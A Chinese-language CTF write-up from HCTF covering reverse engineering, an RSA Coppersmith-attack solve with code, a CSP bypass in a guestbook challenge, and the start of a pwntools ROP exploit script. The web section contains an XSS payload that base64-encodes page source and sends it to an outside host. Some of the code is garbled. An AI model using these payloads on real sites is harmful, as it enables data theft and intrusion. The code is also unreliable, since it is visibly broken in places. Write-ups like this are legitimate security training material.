直接符号执行+求解器求解
step1
xorkey 125
step2
The_
step3
Basic_
step4
0f_RE_
step5
0A0d
4.Crypto So Cool
n 的前一部分与 gen_key 中的 n 相同，因此可以通过相同的一部分得到 u，然后 u des 解密得
到 p4，p4 是 p 中的 640bit，可以对 p4 与 n 用 Coppersmith attack 得到完整 p
p
=
0xa6fb0f78e538c3a514179c984fca1d0a0f184b4d8dc1f3a000c8448f3a230909f8bc9d43ffbe904b67d
939548cba399b58303b261c819342566fa184f3d6bd2dd623981132a7711dd955448d8cf5455e
N
=
0x6ef556110110536b9817a8f9570aee4be4b6f7e4c49eea784a3cb5f0f68eafa0596dcd99ace8802ad9
75fbde513055d0c6be330fb39e18e3db81a5e7ffe93147909e08babb981ffa6f40221d8fe5934e2fd3b26
ea38f992992a6e5abac52fa9311641ba661573f9bd697530c65c1517546eb271f4026d434bafa7eed1ca
40f667d7e52ef61bae8dad6fd9827d1c9b2da330b56148c0bb78eff20aa761b9510c2b2468ceaaa894b2
6d4dfab48d59c5e4e4832d4da569d0a1d90d40dda64693999436ab021235e37ca9bfd6154de833950b
f239e8d836c8ff100370c02e994aab17720bb0303c13b6656d7cd5e5e2bab939d3db78e0b1764ce9066
76d790bc4b49
p = p  = PolynomialRing(Zmod(N), implementation='NTL')
f = x - p
p = p - f.small_roots(X=2^384, beta=0.4)[0]
print hex(int(p))
有了 p 得到 q->phi_n->d，最后解密得到 flag
from libnum import invmod
n
=
0x6ef556110110536b9817a8f9570aee4be4b6f7e4c49eea784a3cb5f0f68eafa0596dcd99ace8802ad9
75fbde513055d0c6be330fb39e18e3db81a5e7ffe93147909e08babb981ffa6f40221d8fe5934e2fd3b26
ea38f992992a6e5abac52fa9311641ba661573f9bd697530c65c1517546eb271f4026d434bafa7eed1ca
40f667d7e52ef61bae8dad6fd9827d1c9b2da330b56148c0bb78eff20aa761b9510c2b2468ceaaa894b2
6d4dfab48d59c5e4e4832d4da569d0a1d90d40dda64693999436ab021235e37ca9bfd6154de833950b
f239e8d836c8ff100370c02e994aab17720bb0303c13b6656d7cd5e5e2bab939d3db78e0b1764ce9066
76d790bc4b49L
p
=
0xa6fb0f78e538c3a514179c984fca1d0a0f184b4d8dc1f3a000c8448f3a230909f8bc9d43ffbe904b67d
939548cba399b58303b261c819342566fa184f3d6bd2dd623981132a7711dd955448d8cf5455e0770
15cd9d96370cea5e21d69e93ca2a10c11149f1340db391c70aef925e9b1cd5ed55dc49295e7a4d3048
cd52102f93L
q = n / p
phi_n = (p - 1) * (q - 1)
e = 0x9b95
d = invmod(e, phi_n)
flag
=
0x27e18a2101e7031f1afc70e40d62e04ab3b55a5433708c4cd45c3d070e31041ee8d24333a9c66210
4bf8fb2c7cc4143d502cd5411ee8750ef2a167e058077a22d7b25c4d1d0a31639584baafa1d88ad59c4
162b7defb8b51f093e423e9a78387b457a0ede39328f9d9a57b547b1b0bc8f6d1d4fed78205e779f1f24
728c2d601894c5d97e244b9775b3b03dc884d07af138ddd1ed9dc7a97135f29e5ece1bc1e4e3ed00a3
dc3e936046f7babbe1ab4bfc1a6f0985a508fa8821f42b9411c4b97508b417307b747f955ea8b920c761
a9202e2bbc691e6cc8338d5aa58025c45a731e33b2e2ee046f8a6529496262dcaa6d17ecde7846b1fe5
89bbe541ee2eece3L
my_flag = pow(flag, d, n)
my_flag = hex(my_flag)[2:-1].decode('hex')
print my_flag
5.Web-guestbook
很典型的一个绕过 csp 的题目,通过 header 头可以看到 csp 的策略
```
Content-Security-Policy:default-src
'self';
script-src
'self'
'unsafe-inline';
font-src
'self'
fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self'
```
根据这个我们发现这个策略很简单,非常类似一般 chrome 浏览器的 csp 策略,题目过滤的
scripte 之类的关键词通过双写可以绕过,单引号换成双引号,就可以了.但是题目有一个
坑...flag 不在 session 中,在源码中.
最终 payload 如下,双写绕过过滤,将 base64 的编码回传到我的平台上,解码得到 flag
```
var n0t = document.createElement("linlinkk");
n0t.setAttribute("rel", "prefetch");
var alb = document.documentElement.outerHTML;
albe1 = alb.substring(500,1200);
n0t.setAttribute("href", "//xss.albertchang.cn/?" + btoa(albe1);
document.head.appendChild(n0t);
```
flag:hctf{c5p_1s_g0od7h1ng2333}
6.Pwn-asm
4 号指令可以泄露 PIE 地址，利用 pop 泄露 LIBC 与栈地址，利用 push 写到栈上做 ROP
脚本：
#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
# opcode : low 4 bit : opcode, high 4 byte : op cnt
# optype follows, each take 4 bit, lsb
# immop follows, each take 4 byte
# executable : 'hfex' signature - 4 byte, dataseg size - 4 byte, |data seg|, |code seg|
def toNumber(s):
if s.startswith('0x'):
return int(s[2:], 16)
elif s.startswith('0b'):
return int(s[2:], 2)
return int(s, 10)
def make_operand(op):
if op == 'r0':
return (1, None)
elif op == 'r1':
return (2, None)
elif op == 'r2':
return (3, None)
elif op == 'sp':
return (4, None)
elif op == 'pc':
return (5, None)
elif op.startswith('*'):
return (6, toNumber(op[1:]))
# dataseg xxx, obsolete
return None
def make_opcode(opcode, operandcnt):
return opcode | (operandcnt << 4)
def make_optype(optype1, optype2):
return optype2 | (optype1 << 4)
def push(op1):
imm_list = []
opcode = make_opcode(1, 1)
op1_parsed = make_operand(op1)
if op1_parsed[0] == 6:
imm_list.append(op1_parsed[1])
optype = make_optype(op1_parsed[0], 0)
data = ''
data += p8(opcode)
data += p8(optype)
for imm in imm_list:
data += p32(imm)
return data
def pop(op1):
imm_list = []
opcode = make_opcode(2, 1)
op1_parsed = make_operand(op1)
if op1_parsed[0] == 6:
imm_list.append(op1_parsed[1])
optype = make_optype(op1_parsed[0], 0)
data = ''
data += p8(opcode)
data += p8(optype)
for imm in imm_list:
data += p32(imm)
return data
def move_imm(op1, op2):
imm_list = []
opcode = make_opcode(4, 2)
op1_parsed = make_operand(op1)
op2_parsed = make_operand(op2)
if op1_parsed[0] == 6:
imm_list.append(op1_parsed[1])
if op2_parsed[0] == 6:
imm_list.append(op2_parsed[1])
optype = make_optype(op1_parsed[0], op2_parsed[0])
data = ''
data += p8(opcode)
data += p8(optype)
for imm in imm_list:
data += p32(imm)
return data
def move_mem(op1, op2):
imm_list = []
opcode = make_opcode(3, 2)
op1_parsed = make_operand(op1)
op2_parsed = make_operand(op2)
if op1_parsed[0] == 6:
imm_list.append(op1_parsed[1])
if op2_parsed[0] == 6:
imm_list.append(op2_parsed[1])
optype = make_optype(op1_parsed[0], op2_parsed[0])
data = ''
data += p8(opcode)
data += p8(optype)
for imm in imm_list:
data += p32(imm)
return data
def cmp(op1, op2):
imm_list = []
opcode = make_opcode(7, 2)
op1_parsed = make_operand(op1)
op2_parsed = make_operand(op2)
if op1_parsed[0] == 6:
imm_list.append(op1_parsed[1])
if op2_parsed[0] == 6:
imm_list.append(op2_parsed[1])
optype = make_optype(op1_parsed[0], op2_parsed[0])
data = ''
data += p8(opcode)
data += p8(optype)
for imm in imm_list:
data += p32(imm)
return data
def ja(op1):
imm_list = []
opcode = make_opcode(9, 1)
op1_parsed = make_operand(op1)
if op1_parsed[0] == 6:
imm_list.append(op1_parsed[1])
optype = make_optype(op1_parsed[0], 0)
data = ''
data += p8(opcode)
data += p8(optype)
for imm in imm_list:
data += p32(imm)